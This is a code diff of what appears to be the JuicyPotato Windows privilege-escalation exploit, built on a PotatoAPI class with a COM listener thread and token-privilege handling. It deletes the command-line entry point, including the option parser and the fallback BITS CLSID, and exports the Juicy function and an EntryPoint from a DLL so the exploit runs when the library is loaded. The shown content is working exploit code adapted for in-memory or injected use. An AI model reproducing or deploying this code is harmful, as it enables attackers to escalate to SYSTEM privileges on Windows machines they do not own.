@@ -22,7 +22,6 @@
 #pragma comment (lib, "AdvApi32.lib")
 #pragma comment(lib, "userenv.lib")
 
-int Juicy(wchar_t *, BOOL);
 wchar_t *olestr;
 wchar_t *g_port;
 wchar_t *rpcserver;
@@ -532,105 +531,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	return TRUE;
 }
 
-
-int wmain(int argc, wchar_t** argv)
-{
-	PotatoAPI* test = new PotatoAPI();
-	BOOL brute = FALSE;
-
-	strcpy(dcom_ip, "127.0.0.1");
-	while ((argc > 1) && (argv[1][0] == '-'))
-	{
-		switch (argv[1][1])
-		{
-			case 't':
-				++argv;
-				--argc;
-				processtype = argv[1];
-				break;
-
-			case 'p':
-				++argv;
-				--argc;
-				processname = argv[1];
-				break;
-
-			case 'l':
-				++argv;
-				--argc;
-				g_port = argv[1];
-				break;
-			
-			case 'c':
-				++argv;
-				--argc;
-				olestr = argv[1];
-				break;
-
-			case 'a':
-				++argv;
-				--argc;
-				processargs = argv[1];
-				break;
-
-			case 'm':
-				++argv;
-				--argc;
-				memset(dcom_ip, 0, 17);
-				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
-				break;
-
-			case 'h':
-				usage();
-				exit(100);
-				break;
-
-			case 'k':
-				++argv;
-				--argc;
-				rpcserver = argv[1];
-				break;
-
-			case 'n':
-				++argv;
-				--argc;
-				rpcport = argv[1];
-				break;
-
-			case 'z':
-				TEST_mode = TRUE;
-				break;
-
-			default:
-				printf("Wrong Argument: %s\n", argv[1]);
-				usage();
-				exit(-1);
-		}
-
-		++argv;
-		--argc;
-	}
-
-	if (g_port == NULL)
-	{
-		usage();
-		exit(-1);
-	}
-
-	if ((processtype == NULL || processname == NULL) && !TEST_mode)
-	{
-		usage();
-		exit(-1);
-	}
-
-	// Fallback to default BITS CLSID
-	if (olestr == NULL)
-		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";
-
-	exit(Juicy(NULL, FALSE));
-}
-
-int Juicy(wchar_t *clsid, BOOL brute)
+__declspec(dllexport) int Juicy(wchar_t *clsid, BOOL brute)
 {
 	PotatoAPI* test = new PotatoAPI();
 	test->startCOMListenerThread();
@@ -694,6 +595,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 	return result;
 }
 
-__declspec(dllexport) void EntryPoint(void) {
+__declspec(dllexport) void EntryPoint(void)
+{
 	Juicy(NULL, FALSE);
 }
